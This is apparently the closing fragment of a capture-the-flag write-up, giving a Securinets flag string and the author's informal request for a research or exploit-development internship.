**Securinets{come_to_tunisia_habibi}**

also i'm looking for a research/exploit-dev internship so if you know some lab or org looking for juniors hit me up (i'm this desperate 😭😭) . I would appreciate it
